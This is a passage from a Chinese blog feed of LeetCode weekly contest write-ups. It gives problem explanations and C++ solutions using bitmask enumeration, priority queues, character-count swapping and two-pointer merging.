                <span class="token keyword">if</span> <span class="token punctuation">(</span>numsMap<span class="token punctuation">.</span><span class="token function">count</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> numsMap<span class="token punctuation">.</span><span class="token function">count</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
                    res<span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> res<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre>

<h1 id="基于陈述统计最多好人数"><a href="#基于陈述统计最多好人数" class="headerlink" title="基于陈述统计最多好人数"></a>基于陈述统计最多好人数</h1><h2 id="题目链接-3"><a href="#题目链接-3" class="headerlink" title="题目链接"></a>题目链接</h2><p><a href="https://leetcode-cn.com/problems/maximum-good-people-based-on-statements/">基于陈述统计最多好人数</a></p>
<h2 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h2><p>本题测试用例中中 <code>2 &lt;= n &lt;= 15</code>，数据量很小，可以考虑直接枚举所有的情况，并检验该情况下是否合理。</p>
<p>所有可能情况个数为 2<sup>n</sup>，每种情况用二进制数 a<sub>n</sub>a<sub>n - 1</sub>···a<sub>0</sub> 来表示，a<sub>n</sub> 为 0 代表该情况下 n 角色为 坏人，a<sub>n</sub> 为 1 代表该情况下 n 角色为 好人。</p>
<p>在统计了该情况下的角色情况后，就对其进行验证。由于坏人既可能说真话也可能说假话，因此对其验证没有意义，我们只需要对该情况下的好人进行验证。验证方法是遍历这个好人的陈述，若出现陈述与该情况不符，则该情况不符合条件，不统计其好人的数目。最终遍历所有的情况后，得到符合条件的好人最大数目。</p>
<h2 id="解题代码-3"><a href="#解题代码-3" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">&#123;</span>
<span class="token keyword">public</span><span class="token operator">:</span>
    <span class="token keyword">int</span> <span class="token function">maximumGood</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span><span class="token operator">&amp;</span> statements<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">int</span> n <span class="token operator">=</span> statements<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">int</span> res <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">int</span> cnt <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
            vector<span class="token operator">&lt;</span><span class="token keyword">bool</span><span class="token operator">></span> <span class="token function">isGood</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>i <span class="token operator">>></span> j<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 统计状态 i 的好人与坏人</span>
                    isGood<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
                    cnt<span class="token operator">++</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
                <span class="token keyword">else</span>
                    isGood<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token comment">// 验证状态是否合理</span>
            <span class="token keyword">bool</span> isLegal <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>isGood<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 若 j 是好人，则遍历他的陈述是否正确</span>
                    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> k <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> k<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                        <span class="token keyword">if</span> <span class="token punctuation">(</span>statements<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>isGood<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                            isLegal <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
                            <span class="token keyword">break</span><span class="token punctuation">;</span>
                        <span class="token punctuation">&#125;</span>
                        <span class="token keyword">if</span> <span class="token punctuation">(</span>statements<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> isGood<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                            isLegal <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
                            <span class="token keyword">break</span><span class="token punctuation">;</span>
                        <span class="token punctuation">&#125;</span>
                    <span class="token punctuation">&#125;</span>
                <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span>isLegal<span class="token punctuation">)</span>
                res <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>res<span class="token punctuation">,</span> cnt<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> res<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre>

]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>算法</tag>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode周赛总结 第327场</title>
    <url>/2023/01/08/LeetCode%E5%91%A8%E8%B5%9B%E6%80%BB%E7%BB%93%20%E7%AC%AC327%E5%9C%BA/</url>
    <content><![CDATA[<p>由于考研等因素的影响，已经时隔一年没有参加力扣周赛了，长时间没有好好琢磨算法题，思维敏捷度确实有所下降，好在这次周赛前两题都没有什么难度，但第三题却把简单问题想复杂了，第四题就基本上都没怎么读题了。。。</p>
<span id="more"></span>

<h1 id="正整数和负整数的最大计数"><a href="#正整数和负整数的最大计数" class="headerlink" title="正整数和负整数的最大计数"></a>正整数和负整数的最大计数</h1><h2 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h2><p><a href="https://leetcode.cn/problems/maximum-count-of-positive-integer-and-negative-integer/">正整数和负整数的最大计数</a></p>
<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>直接依照题意统计该数组中正整数和负整数的个数，然后返回较大个数即可，送分题。</p>
<h2 id="解题代码"><a href="#解题代码" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">&#123;</span>
<span class="token keyword">public</span><span class="token operator">:</span>
    <span class="token keyword">int</span> <span class="token function">maximumCount</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">int</span> cnt1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> cnt2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token operator">++</span>cnt1<span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token operator">++</span>cnt2<span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> <span class="token function">max</span><span class="token punctuation">(</span>cnt1<span class="token punctuation">,</span> cnt2<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre>

<h1 id="执行-K-次操作后的最大分数"><a href="#执行-K-次操作后的最大分数" class="headerlink" title="执行 K 次操作后的最大分数"></a>执行 K 次操作后的最大分数</h1><h2 id="题目链接-1"><a href="#题目链接-1" class="headerlink" title="题目链接"></a>题目链接</h2><p><a href="https://leetcode.cn/problems/maximal-score-after-applying-k-operations/">执行 K 次操作后的最大分数</a></p>
<h2 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h2><p>同样也是直接模拟，既然要求的是所能获得的最大分数，那么只需保证每次从数组中选取的是当前数组的最大值即可。对于此类贪心选择问题，容易想到利用优先队列（基于堆实现），相较于顺序查找最大值，优先队列可将每次选取最大值的时间复杂度降至 O(log(n))。</p>
<p>具体步骤是先将数组所有元素存入优先队列中，然后选出队头元素（即最大值）并出队，分数累加该值后，按照题意将该值替换为 <code>ceil(nums[i]) / 3</code>，再存入优先队列中，重复操作 k 次即可得到结果。</p>
<p>对于向上取整的处理很简单，只需判断该数 val 能否被 3 整除，若能，则直接令 val = val / 3 即可，若不能，由于整数相除会舍弃小数位，即相当于向下取整，因此令 val = val / 3 + 1.</p>
<h2 id="解题代码-1"><a href="#解题代码-1" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">&#123;</span>
<span class="token keyword">public</span><span class="token operator">:</span>
    <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token function">maxKelements</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> k<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        priority_queue<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> maxQueue<span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            maxQueue<span class="token punctuation">.</span><span class="token function">emplace</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">long</span> <span class="token keyword">long</span> res <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> k<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">int</span> maxVal <span class="token operator">=</span> maxQueue<span class="token punctuation">.</span><span class="token function">top</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            maxQueue<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            res <span class="token operator">+=</span> maxVal<span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>maxVal <span class="token operator">%</span> <span class="token number">3</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                maxVal <span class="token operator">/=</span> <span class="token number">3</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                maxVal <span class="token operator">=</span> maxVal <span class="token operator">/</span> <span class="token number">3</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            maxQueue<span class="token punctuation">.</span><span class="token function">emplace</span><span class="token punctuation">(</span>maxVal<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> res<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre>

<h1 id="使字符串总不同字符的数目相等"><a href="#使字符串总不同字符的数目相等" class="headerlink" title="使字符串总不同字符的数目相等"></a>使字符串总不同字符的数目相等</h1><h2 id="题目链接-2"><a href="#题目链接-2" class="headerlink" title="题目链接"></a>题目链接</h2><p><a href="https://leetcode.cn/problems/make-number-of-distinct-characters-equal/">使字符串总不同字符的数目相等</a></p>
<h2 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h2><p>本题最开始写的时候思路很不清晰，写了一大堆判断条件最终也没能成功求解。</p>
<p>事实上本题如果注意到一个关键点就能很快建立思路，即两字符串之间各个字符的交换其实完全可以等价为两字符串之间各种字符的交换，因为题目要求两字符串不同字符个数相同，因此其实与各字符所处的下标无关，即当 <code>word1 = &quot;abcc&quot;, word2 = &quot;aab&quot;</code> 时，word1[2] 和 word2[0] 交换与 word1[3] 和 word[1] 交换其实是完全一样的。明白这一点之后，发现交换的可能性最大不过 26 * 26 种，完全可以直接枚举求解。</p>
<p>基本求解步骤如下：对于 word1 和 word2 分别设置长度为 26 的数组 chCnt1 和 chCnt2 统计各字母在字符串的个数，cnt1 和 cnt2 分别统计两字符串不同字符的个数。然后执行一个 26 * 26 的二重循环，表示 word1 的 i 字符与 word2 的 j 字符交换，修改 chCnt1, chCnt2 的值，以判断交换后是否满足不同字符个数相同，若不满足，将修改过的 chCnt 数组复原。</p>
<h2 id="解题代码-2"><a href="#解题代码-2" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">&#123;</span>
<span class="token keyword">public</span><span class="token operator">:</span>
    <span class="token keyword">bool</span> <span class="token function">isItPossible</span><span class="token punctuation">(</span>string word1<span class="token punctuation">,</span> string word2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">int</span> cnt1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> cnt2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">chCnt1</span><span class="token punctuation">(</span><span class="token number">26</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">chCnt2</span><span class="token punctuation">(</span><span class="token number">26</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> word1<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">int</span> idx <span class="token operator">=</span> word1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token string">'a'</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>chCnt1<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token operator">++</span>cnt1<span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token operator">++</span>chCnt1<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> word2<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">int</span> idx <span class="token operator">=</span> word2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token string">'a'</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>chCnt2<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token operator">++</span>cnt2<span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token operator">++</span>chCnt2<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">26</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token number">26</span><span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>chCnt1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">||</span> chCnt2<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    <span class="token keyword">continue</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
                <span class="token keyword">int</span> c1 <span class="token operator">=</span> cnt1<span class="token punctuation">,</span> c2 <span class="token operator">=</span> cnt2<span class="token punctuation">;</span>
                <span class="token operator">--</span>chCnt1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>chCnt1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">--</span>c1<span class="token punctuation">;</span>
                <span class="token operator">++</span>chCnt1<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>chCnt1<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">++</span>c1<span class="token punctuation">;</span>
                <span class="token operator">--</span>chCnt2<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>chCnt2<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">--</span>c2<span class="token punctuation">;</span>
                <span class="token operator">++</span>chCnt2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>chCnt2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">++</span>c2<span class="token punctuation">;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>c1 <span class="token operator">==</span> c2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
                <span class="token operator">++</span>chCnt1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
                <span class="token operator">--</span>chCnt1<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>
                <span class="token operator">++</span>chCnt2<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>
                <span class="token operator">--</span>chCnt2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre>
]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>算法</tag>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode周赛总结 第333场</title>
    <url>/2023/02/19/LeetCode%E5%91%A8%E8%B5%9B%E6%80%BB%E7%BB%93%20%E7%AC%AC333%E5%9C%BA/</url>
    <content><![CDATA[<h1 id="合并两个二维数组-求和法"><a href="#合并两个二维数组-求和法" class="headerlink" title="合并两个二维数组 - 求和法"></a>合并两个二维数组 - 求和法</h1><h2 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h2><p><a href="https://leetcode.cn/problems/merge-two-2d-arrays-by-summing-values/">合并两个二维数组 - 求和法</a></p>
<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>本题较为基础，可以直接分别遍历两数组，再用哈希表记录两数组中各编号的累加和，但该方法比较消耗空间，时间上的性能也不理想。</p>
<p>考虑到数组 nums1 和 nums2 都包含<strong>互不相同</strong>的 id，并按 id 以<strong>递增</strong>顺序排列，因此想到利用归并排序的思想，设立双指针 p1 和 p2，若两指针所指数组元素的 id 相同，则将 <code>&#123; nums1[p1][0], nums1[p1][1] + nums2[p2][1] &#125;</code> 进行归并，否则将较小 id 的元素（假设 p1 所指元素 id 更小） <code>&#123; nums1[p1][0], nums1[p1][1] &#125;</code> 进行归并。</p>
<h2 id="解题代码"><a href="#解题代码" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">&#123;</span>
<span class="token keyword">public</span><span class="token operator">:</span>
    vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span> <span class="token function">mergeArrays</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span><span class="token operator">&amp;</span> nums1<span class="token punctuation">,</span> vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span><span class="token operator">&amp;</span> nums2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span> res<span class="token punctuation">;</span>
        <span class="token keyword">int</span> p1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> p2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span>p1 <span class="token operator">&lt;</span> nums1<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> p2 <span class="token operator">&lt;</span> nums2<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>nums1<span class="token punctuation">[</span>p1<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> nums2<span class="token punctuation">[</span>p2<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                res<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> nums1<span class="token punctuation">[</span>p1<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> nums1<span class="token punctuation">[</span>p1<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> nums2<span class="token punctuation">[</span>p2<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token operator">++</span>p1<span class="token punctuation">;</span>
                <span class="token operator">++</span>p2<span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>nums1<span class="token punctuation">[</span>p1<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> nums2<span class="token punctuation">[</span>p2<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                res<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> nums1<span class="token punctuation">[</span>p1<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> nums1<span class="token punctuation">[</span>p1<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token operator">++</span>p1<span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                res<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> nums2<span class="token punctuation">[</span>p2<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> nums2<span class="token punctuation">[</span>p2<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
